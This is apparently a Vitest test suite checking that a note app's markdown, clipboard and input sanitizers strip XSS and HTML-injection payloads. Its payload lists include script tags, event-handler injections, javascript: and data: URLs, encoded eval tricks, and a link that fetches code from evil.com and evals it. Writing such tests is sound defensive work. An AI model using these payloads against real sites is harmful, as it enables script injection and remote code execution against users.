/**
 * Enterprise-grade security test suite
 * Tests for XSS, injection attacks, and malicious input handling
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import '@testing-library/jest-dom'

import {
  sanitizeMarkdown,
  sanitizeClipboardContent,
  sanitizeUserInput,
  validateContentSecurity
} from '../utils/sanitization'
import Note from '../components/Note'

describe('Security Test Suite', () => {
  describe('XSS Protection', () => {
    it('should prevent script injection in markdown content', () => {
      const maliciousInput = '<script>alert("XSS")</script>**Bold text**'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('**Bold text**')
    })

    it('should remove javascript: protocols', () => {
      const maliciousInput = '[Click me](javascript:alert("XSS"))'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('alert')
    })

    it('should remove data: URLs', () => {
      const maliciousInput = '<img src="data:text/html,<script>alert(1)</script>">'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('data:')
      expect(sanitized).not.toContain('<script>')
    })

    it('should remove event handlers', () => {
      const maliciousInput = '<div onclick="alert(\\'XSS\\')">Content</div>'
      const sanitized = sanitizeMarkdown(maliciousInput)

      expect(sanitized).not.toContain('onclick')
      expect(sanitized).not.toContain('alert')
    })

    it('should remove dangerous HTML tags', () => {
      const maliciousInputs = [
        '<iframe src="http://evil.com"></iframe>',
        '<object data="malicious.swf"></object>',
        '<embed src="malicious.swf">',
        '<form><input type="text"></form>',
        '<style>body { display: none; }</style>'
      ]

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeMarkdown(input)
        expect(sanitized).not.toMatch(/<(iframe|object|embed|form|input|style)/i)
      })
    })
  })

  describe('Input Sanitization', () => {
    it('should enforce maximum length limits', () => {
      const longInput = 'a'.repeat(20000)
      const sanitized = sanitizeUserInput(longInput, { maxLength: 1000 })

      expect(sanitized.length).toBe(1000)
    })

    it('should escape HTML entities', () => {
      const htmlInput = '<script>alert("test")</script>'
      const sanitized = sanitizeUserInput(htmlInput)

      expect(sanitized).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;')
    })

    it('should handle null and undefined inputs safely', () => {
      expect(sanitizeUserInput(null)).toBe('')
      expect(sanitizeUserInput(undefined)).toBe('')
      expect(sanitizeUserInput('')).toBe('')
    })

    it('should sanitize clipboard content safely', () => {
      const title = '<script>alert("title")</script>My Title'
      const content = 'Some content with <script>alert("content")</script>'

      const sanitized = sanitizeClipboardContent(title, content)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('My Title')
      expect(sanitized).toContain('Some content')
    })
  })

  describe('Content Security Validation', () => {
    it('should detect script tags', () => {
      const maliciousContent = 'Normal text <script>alert("xss")</script> more text'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasScripts')
      expect(security.riskLevel).toBe('high')
    })

    it('should detect event handlers', () => {
      const maliciousContent = '<div onclick="maliciousFunction()">Click me</div>'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasEventHandlers')
    })

    it('should detect javascript protocols', () => {
      const maliciousContent = '<a href="javascript:alert(\\'xss\\')">Click</a>'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasJavascriptProtocol')
    })

    it('should detect data URLs', () => {
      const maliciousContent = '<img src="data:text/html,<script>alert(1)</script>">'
      const security = validateContentSecurity(maliciousContent)

      expect(security.isSecure).toBe(false)
      expect(security.violations).toContain('hasDataUrls')
    })

    it('should allow safe content', () => {
      const safeContent = '# Title\\n\\nSome **bold** text with [safe link](https://example.com)'\n      const security = validateContentSecurity(safeContent)\n      \n      expect(security.isSecure).toBe(true)\n      expect(security.violations).toHaveLength(0)\n      expect(security.riskLevel).toBe('low')\n    })\n  })\n\n  describe('Component Security Integration', () => {\n    let mockOnUpdate, mockOnDelete, user\n\n    beforeEach(() => {\n      mockOnUpdate = vi.fn()\n      mockOnDelete = vi.fn()\n      user = userEvent.setup()\n    })\n\n    const createTestNote = (content = '', title = '') => ({\n      id: 'test-note-1',\n      title,\n      content,\n      position: { x: 100, y: 100 },\n      dimensions: { width: 300, height: 200 },\n      color: '#ffffff'\n    })\n\n    it('should sanitize malicious input in title field', async () => {\n      const note = createTestNote()\n      render(\n        <Note\n          note={note}\n          onUpdate={mockOnUpdate}\n          onDelete={mockOnDelete}\n          isSelected={true}\n        />\n      )\n\n      // Click to edit\n      await user.click(screen.getByText('Click to add content...'))\n      \n      const titleInput = screen.getByPlaceholderText('Untitled')\n      await user.type(titleInput, '<script>alert(\"xss\")</script>Safe Title')\n\n      // Trigger save\n      await user.keyboard('{Control>}{Enter}')\n\n      await waitFor(() => {\n        expect(mockOnUpdate).toHaveBeenCalled()\n        const updatedNote = mockOnUpdate.mock.calls[0][0]\n        expect(updatedNote.title).not.toContain('<script>')\n        expect(updatedNote.title).not.toContain('alert')\n        expect(updatedNote.title).toContain('Safe Title')\n      })\n    })\n\n    it('should sanitize malicious input in content field', async () => {\n      const note = createTestNote()\n      render(\n        <Note\n          note={note}\n          onUpdate={mockOnUpdate}\n          onDelete={mockOnDelete}\n          isSelected={true}\n        />\n      )\n\n      // Click to edit\n      await user.click(screen.getByText('Click to add content...'))\n      \n      const contentInput = screen.getByPlaceholderText('Click to add content...')\n      await user.type(contentInput, '<script>alert(\"xss\")</script>\\n\\n**Safe content**')\n\n      // Trigger auto-save by waiting\n      await waitFor(() => {\n        expect(mockOnUpdate).toHaveBeenCalled()\n        const updatedNote = mockOnUpdate.mock.calls[0][0]\n        expect(updatedNote.content).not.toContain('<script>')\n        expect(updatedNote.content).not.toContain('alert')\n        expect(updatedNote.content).toContain('**Safe content**')\n      }, { timeout: 2000 })\n    })\n\n    it('should prevent XSS in rendered markdown', () => {\n      const maliciousNote = createTestNote('<script>alert(\"xss\")</script>**Bold text**', 'Test Title')\n      \n      render(\n        <Note\n          note={maliciousNote}\n          onUpdate={mockOnUpdate}\n          onDelete={mockOnDelete}\n          isSelected={false}\n        />\n      )\n\n      // Check that script tags are not present in the DOM\n      expect(document.querySelector('script')).toBeNull()\n      expect(screen.queryByText(/alert/)).toBeNull()\n      \n      // But safe content should be rendered\n      expect(screen.getByText('Test Title')).toBeInTheDocument()\n    })\n\n    it('should handle malicious clipboard operations safely', async () => {\n      const note = createTestNote('Normal content', 'Normal title')\n      \n      // Mock clipboard API\n      const mockWriteText = vi.fn()\n      Object.assign(navigator, {\n        clipboard: {\n          writeText: mockWriteText\n        }\n      })\n\n      render(\n        <Note\n          note={note}\n          onUpdate={mockOnUpdate}\n          onDelete={mockOnDelete}\n          isSelected={true}\n        />\n      )\n\n      // Hover to show menu\n      const noteElement = screen.getByText('Normal title').closest('div')\n      await user.hover(noteElement)\n\n      // Click the menu button (three dots)\n      const menuButton = screen.getByText('⋯')\n      await user.click(menuButton)\n\n      // Click copy\n      const copyButton = screen.getByText('Copy')\n      await user.click(copyButton)\n\n      await waitFor(() => {\n        expect(mockWriteText).toHaveBeenCalled()\n        const copiedText = mockWriteText.mock.calls[0][0]\n        \n        // Verify no script tags in copied content\n        expect(copiedText).not.toContain('<script>')\n        expect(copiedText).toContain('Normal title')\n        expect(copiedText).toContain('Normal content')\n      })\n    })\n  })\n\n  describe('Injection Attack Prevention', () => {\n    const commonPayloads = [\n      // XSS payloads\n      '<script>alert(1)</script>',\n      '<img src=x onerror=alert(1)>',\n      'javascript:alert(1)',\n      '<svg onload=alert(1)>',\n      '<iframe src=\"javascript:alert(1)\"></iframe>',\n      \n      // HTML injection\n      '<style>body{display:none}</style>',\n      '<link rel=\"stylesheet\" href=\"http://evil.com/evil.css\">',\n      '<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">',\n      \n      // Protocol handlers\n      'data:text/html,<script>alert(1)</script>',\n      'vbscript:msgbox(1)',\n      'livescript:alert(1)',\n      \n      // Event handlers\n      '<div onclick=\"alert(1)\">click</div>',\n      '<button onmouseover=\"alert(1)\">hover</button>',\n      '<input onfocus=\"alert(1)\" autofocus>'\n    ]\n\n    it.each(commonPayloads)('should neutralize payload: %s', (payload) => {\n      const sanitized = sanitizeUserInput(payload)\n      \n      // Verify dangerous elements are removed/escaped\n      expect(sanitized.toLowerCase()).not.toContain('<script')\n      expect(sanitized.toLowerCase()).not.toContain('javascript:')\n      expect(sanitized.toLowerCase()).not.toContain('data:')\n      expect(sanitized.toLowerCase()).not.toContain('vbscript:')\n      expect(sanitized.toLowerCase()).not.toMatch(/on\\w+\\s*=/)\n      expect(sanitized).not.toContain('alert')\n    })\n\n    it('should handle nested and encoded attacks', () => {\n      const nestedPayloads = [\n        '<scr<script>ipt>alert(1)</scr</script>ipt>',\n        '<img src=\"\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">',\n        '<<SCRIPT>alert(1)//<</SCRIPT>',\n        '<script>alert(String.fromCharCode(88,83,83))</script>'\n      ]\n\n      nestedPayloads.forEach(payload => {\n        const sanitized = sanitizeUserInput(payload)\n        expect(sanitized.toLowerCase()).not.toContain('<script')\n        expect(sanitized).not.toContain('alert')\n        expect(sanitized).not.toContain('eval')\n      })\n    })\n  })\n\n  describe('Performance and DoS Protection', () => {\n    it('should handle extremely large inputs without crashing', () => {\n      const hugeInput = 'x'.repeat(1000000) // 1MB of text\n      \n      expect(() => {\n        const sanitized = sanitizeUserInput(hugeInput, { maxLength: 10000 })\n        expect(sanitized.length).toBe(10000)\n      }).not.toThrow()\n    })\n\n    it('should handle deeply nested HTML without stack overflow', () => {\n      const deeplyNested = '<div>'.repeat(1000) + 'content' + '</div>'.repeat(1000)\n      \n      expect(() => {\n        const sanitized = sanitizeUserInput(deeplyNested)\n        expect(sanitized).toBeDefined()\n      }).not.toThrow()\n    })\n\n    it('should handle malformed HTML gracefully', () => {\n      const malformedInputs = [\n        '<div><span><p>unclosed tags',\n        '<img src=\"unclosed quote>',\n        '<script>var x = \"</script>',\n        '<<<>>><><><script>alert(1)',\n        '\\x00\\x01\\x02\\x03\\x04\\x05'\n      ]\n\n      malformedInputs.forEach(input => {\n        expect(() => {\n          const sanitized = sanitizeUserInput(input)\n          expect(sanitized).toBeDefined()\n        }).not.toThrow()\n      })\n    })\n  })\n\n  describe('Regression Tests', () => {\n    // These tests ensure previously fixed vulnerabilities don't return\n    \n    it('should prevent the clipboard XSS vulnerability (Issue #001)', () => {\n      const maliciousTitle = '<img src=x onerror=alert(\"XSS in title\")>'\n      const maliciousContent = '<script>document.cookie=\"stolen\"</script>'\n      \n      const sanitized = sanitizeClipboardContent(maliciousTitle, maliciousContent)\n      \n      expect(sanitized).not.toContain('<img')\n      expect(sanitized).not.toContain('<script')\n      expect(sanitized).not.toContain('onerror')\n      expect(sanitized).not.toContain('alert')\n      expect(sanitized).not.toContain('document.cookie')\n    })\n\n    it('should prevent markdown renderer XSS (Issue #002)', () => {\n      const maliciousMarkdown = '[Click me](javascript:fetch(\"http://evil.com\").then(r=>r.text()).then(eval))'\n      \n      const sanitized = sanitizeMarkdown(maliciousMarkdown)\n      \n      expect(sanitized).not.toContain('javascript:')\n      expect(sanitized).not.toContain('fetch')\n      expect(sanitized).not.toContain('eval')\n    })\n  })\n})"